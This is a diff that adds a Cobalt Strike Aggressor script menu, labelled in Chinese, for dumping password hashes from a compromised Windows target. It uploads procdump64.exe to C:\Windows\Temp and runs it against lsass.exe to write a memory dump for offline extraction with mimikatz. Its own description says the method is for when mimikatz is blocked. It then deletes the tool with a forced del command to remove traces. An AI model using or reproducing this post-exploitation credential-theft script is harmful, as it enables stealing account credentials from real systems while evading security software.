@@ -1,0 +1,26 @@
+	menu "目标机密码HASH" {
+			item "上传 Procdump" {
+				$bid = $1;
+				$dialog = dialog("上传 Procdump", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &proupload);
+                dialog_description($dialog, "mimikatz被拦截情况下，可以使用Procdump转储hash，再下载下来本地使用mimikatz读取");
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+sub proupload {
+
+    bcd($bid, $3['UploadPath']);
+    bupload($bid, script_resource("/scripts/systemhash/procdump64.exe"));
+}
+
+    item "运行 Procdump"{
+            bshell($1, "procdump64.exe -accepteula -ma lsass.exe lsass.dmp");
+                }
+
+        	item "删除 Procdump"{
+        	local('$bid');
+        	foreach $bid ($1){
+                bshell($1, "del /f /s /q procdump64.exe");
+                }
+		}
+}
